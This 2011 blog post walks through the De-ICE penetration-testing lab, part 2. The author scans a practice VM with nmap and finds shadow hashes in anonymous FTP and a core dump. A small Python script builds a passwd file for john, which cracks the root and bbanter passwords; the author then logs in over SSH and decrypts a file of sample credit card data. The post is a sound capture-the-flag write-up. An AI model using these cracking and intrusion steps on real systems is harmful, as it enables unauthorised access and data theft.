---
layout: post
title: "De-ICE hacking challenge: Part 2"
date: 2011-07-20 18:10:26 -0400
comments: true
categories: boot2root hacking
alias: /2011/07/de-ice-hacking-challenge-part-2.html
---

In my previous [post](/2011/07/19/de-ice-hacking-challenge-part-1/) I talked about how I completed part 1 of the De-ICE hacking challenge. If you're not sure what De-ICE is, I recommend reading my last post and checking out [HackingDojo](http://hackingdojo.com/pentest-media/), home of the De-ICE penetration testing Live CDs. 

<!--more-->

The second challenge requires breaking into an FTP server, which is supposedly more secure than the server in the first challenge. The FTP server has an IP address of 192.168.1.110. I'm using the same setup, with my attacking machine running Backtrack 4RT2, and the target running under VMware. 

As before, I fired up the web browser to see what they had on there:

A relatively simple website, again with the email addresses and names of the systems administrators. I noted this information down and proceeded to check what ports were running on their FTP server:

```
root@tantras# nmap -sS -A 192.168.1.110
 
Starting Nmap 5.35DC1 ( http://nmap.org ) at 2011-07-19 20:00 EDT
Nmap scan report for 192.168.1.110
Host is up (0.00042s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.0.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh?
80/tcp  open  http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_html-title: Site doesn't have a title (text/html).
631/tcp open  ipp     CUPS 1.1
MAC Address: 00:0C:29:97:05:79 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS details: Linux 2.6.13 - 2.6.31
Network Distance: 1 hop
Service Info: OS: Unix
 
TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 192.168.1.110
 
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.25 seconds
```

SSH is open on this server. I had already cracked the passwords for the systems administrators in part 1, so I decided to see if they would work. In the real world, people tend to use the same passwords for a lot of their machines. In this case, none of the passwords in the first challenge worked.

I thought about running hydra again to guess the passwords, but decided to hold off on it because I knew it would take a long time to complete. It looked like anonymous FTP was allowed, so I decided to try that avenue first. I connected as an anonymous user to the FTP server and listed the contents of some of the directories. To my surprise I found a etc/shadow file buried in there. 

```
root@tantras# ftp 192.168.1.110
Connected to 192.168.1.110.
220 (vsFTPd 2.0.4)
Name (192.168.1.110:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    7 1000     513           160 Mar 15  2007 download
drwxrwxrwx    2 0        0              60 Feb 26  2007 incoming
226 Directory send OK.
ftp> ls incoming
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls download
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    6 1000     513           340 Mar 15  2007 etc
drwxr-xr-x    4 1000     513           100 Mar 15  2007 opt
drwxr-xr-x   10 1000     513           400 Mar 15  2007 root
drwxr-xr-x    5 1000     513           120 Mar 15  2007 usr
drwxr-xr-x    3 1000     513            80 Mar 15  2007 var
226 Directory send OK.
ftp> ls download/etc/
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 1000     513           160 Mar 15  2007 X11
-rw-r--r--    1 1000     513        362436 Mar 03  2007 core
drwxr-xr-x    2 1000     513           100 Mar 15  2007 fonts
-rw-r--r--    1 1000     513           780 Apr 30  2005 hosts
-rw-r--r--    1 1000     513           718 Jul 03  2005 inputrc
-rw-r--r--    1 1000     513          1296 Jun 10  2006 issue
-rw-r--r--    1 1000     513           183 Jun 23  2005 lisarc
-rw-r--r--    1 1000     513            56 Oct 21  2004 localtime
lrwxrwxrwx    1 1000     513            23 Jul 19 18:28 localtime-copied-from -> /usr/share/zoneinfo/GMT
-rw-r--r--    1 1000     513         10289 Dec 31  2003 login.defs
-rw-r--r--    1 1000     513             1 Dec 31  2003 motd-slax
drwxr-xr-x    2 1000     513           100 Mar 15  2007 profile.d
drwxr-xr-x    2 1000     513           220 Mar 15  2007 rc.d
-rw-r--r--    1 1000     513           440 Jul 18  2006 shadow
226 Directory send OK.
```

I thought that if it were a real shadow file, then I'd be able to crack some user accounts. I decided to download the contents of the FTP server so I could examine all the directories and files properly:

```
root@tantras# wget -rq ftp://192.168.1.110
root@tantras# ls
192.168.1.110
```

Now that I had mirrored the FTP server, I decided to take a closer look at the shadow file:

```
root@tantras# cat shadow 
root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
```

Only the root account was listed in there, so no encrypted passwords for the system administrators. In the previous challenge, root was not allowed to SSH into the server. I assumed it would be the same for this challenge, which meant cracking the root password now might not benefit me that much until I could actually log into the server.

I took another look at the contents of the etc directory and noticed a core file. This is typically a core dump, which meant it probably held some juicy bits of information. I fired up strings and paged through the contents of the dump. I found the interesting bits at the very end of the file:

```
.gnu.version
.gnu.version_d
.text
.note
.eh_frame_hdr
.eh_frame
.dynamic
.useless
root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::
::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:
0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:979
7:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::game
s:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::m
ysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0::::
:gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0::
:::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0
:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy
1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0p
DXCCMQu70/:13574:0:99999:7:::
```

Looks like /etc/shadow entries for the root account and the system administrators! Now if I could crack one of their passwords, I'd be able to log in through SSH and su to root. After a bit of cutting and pasting, I ended up with a shadow file that looked like this:

```
root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::
```

To crack this using john, I needed the corresponding passwd file which I didn't have. Fortunately it's easy enough to just create a dummy passwd file and insert the encrypted passwords into it. I wrote a short script to do it for me:

``` python
#!/usr/bin/env python
# shadow2pass: generate a dummy passwd file with 
# the encrypted passwords from a shadow file
 
import sys
 
start_uid = 500  # random UID
start_gid = 500  # random GID
for line in open(sys.argv[1]):
    a = line.split(":")
    print "%s:%s:%d:%d:,,,:/home/%s:/bin/bash" % \
        (a[0], a[1], start_uid, start_gid, a[0])
    start_uid += 1
```

I ran the script and passed it the shadow file and it gave me an unshadowed passwd file:

```
root@tantras# ~/bin/shadow2pass myshadow.txt > mypass.txt
root@tantras# cat mypass.txt 
root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:500:500:,,,:/home/root:/bin/bash
aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:501:500:,,,:/home/aadams:/bin/bash
bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:502:500:,,,:/home/bbanter:/bin/bash
ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:503:500:,,,:/home/ccoffee:/bin/bash
```

Now I had a proper file that I could run through john for cracking. I decided to use the same customized password list I had used before. After waiting several minutes, john finished running without cracking any passwords. Either my password list was too small, or the passwords were too complicated which meant I'd have to switch to a brute force attack which could take a very long time. I decided to try a larger password list to see if it would be more fruitful:

```
root@tantras# /pentest/passwords/jtr/john --wordlist=/pentest/passwords/wordlists/darkc0de.lst mypass.txt 
Loaded 4 password hashes with 4 different salts (FreeBSD MD5 [32/32])
Complexity       (root)
Zymurgy          (bbanter)
guesses: 2  time: 0:00:11:10 100.00% (ETA: Tue Jul 19 20:52:28 2011)  c/s: 5369  trying: �f 
```

Two passwords cracked, one for root and one for bbanter. I recalled that bbanter was an intern in the first challenge, and I hoped that his account would at least allow me to su to root. Armed with his password, I logged in to the server via SSH:

```
root@tantras# ssh bbanter@192.168.1.110
The authenticity of host '192.168.1.110 (192.168.1.110)' can't be established.
RSA key fingerprint is 3b:5c:88:a9:a3:d7:96:88:1b:54:0d:0b:f3:06:a9:de.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.110' (RSA) to the list of known hosts.
bbanter@192.168.1.110's password: 
Linux 2.6.16.
bbanter@slax:~$ id
uid=1001(bbanter) gid=100(users) groups=100(users)
```

A successful login, I went ahead and tried to get root:

```
bbanter@slax:~$ su - 
Password: **********
root@slax:~# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
```

Success! The server has been rooted. Now that I had unrestricted access, I started exploring a bit more. After several minutes of poking around in /etc, I ended up in /home. The system administrator home directories contained nothing of interest. It was curious however that there was a /home/root considering root's home directory is actually /root. I looked inside the directory and found a hidden directory .save which contained a couple of interesting files:

```
root@slax:/home/root/.save# ls -l
total 8
-r-x------ 1 root   root 198 Mar 13  2007 copy.sh*
-rw-r--r-- 1 aadams  513 560 Mar 13  2007 customer_account.csv.enc
```

In the first challenge, I encountered a file salary_dec2003.csv.enc that turned out to be a file encrypted with openssl. I assumed this was yet another openssl encrypted file. I decided to leave that alone for a minute and look at the contents of copy.sh:

``` bash
#!/bin/sh
#encrypt files in ftp/incoming
openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out /home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw
#remove old file
rm /home/ftp/incoming/$1
```

It looked to be the script that created the encrypted customer_account.csv.enc. The cipher used and the password were all in the script, so I copied the openssl command in the file, set the decryption option and was able to obtain the file's contents:

```
root@slax:/home/root/.save# openssl enc -d -aes-256-cbc -salt -in ./customer_account.csv.enc -pass file:/etc/ssl/certs/pw 
"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"
```

It worked! The decrypted file contains credit card information of customers. At this point I decided to look at the hints page to see if I had completed all the tasks, and sure enough, the challenge was over. 

An alternative way to get into the server would be to run an SSH dictionary attack against the SSH service using hydra and waiting to get a working login name and password combination. I decided not to go through this route because it just takes too long. 

Overall I found part 2 to be much easier and a little more fun since it involved a bit more detective work to figure out how to penetrate the system. De-ICE has a level 2 challenge available, but I have yet to try it. When I do, I will post my experience and solutions to solving the challenge. 

